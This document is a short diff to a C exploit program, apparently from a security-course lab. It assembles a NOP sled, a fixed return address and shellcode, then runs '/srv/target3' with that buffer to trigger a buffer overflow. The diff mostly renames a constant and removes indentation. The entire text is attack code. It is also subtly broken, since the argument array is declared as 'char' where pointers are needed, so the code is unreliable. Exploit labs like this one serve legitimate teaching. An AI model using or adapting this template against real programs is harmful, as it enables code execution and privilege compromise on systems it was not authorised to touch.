@@ -4,24 +4,20 @@
 #include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
-
 const char* TARGET = "/srv/target3";
-
 const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
-const char* ADD = "\xc0\xde\xff\xff";
-
+const char* ADDR = "\xc0\xde\xff\xff";
 char* prep() {
-  char* buf = malloc(strlen(SLED) + strlen(ADD) + sizeof(shellcode) + 1);
-  sprintf(buf, "%s%s%s", SLED, ADD, shellcode);
-  return buf;
+char* buf = malloc(strlen(SLED) + strlen(ADDR) + sizeof(shellcode) + 1);
+sprintf(buf, "%s%s%s", SLED, ADDR, shellcode);
+return buf;
+}
+int main(void) {
+char args[] = {(char)TARGET, prep(), NULL};
+char *envp[] = {NULL};
+if (execve(TARGET, args, envp) == -1) {
+    perror("execve failed");
 }
 
-int main(void) {
-  char args[] = {(char)TARGET, prep(), NULL};
-  char *envp[] = {NULL};
-  if (execve(TARGET, args, envp) == -1) {
-      perror("execve failed");
-  }
-
-  return 0;
+return 0;
 }
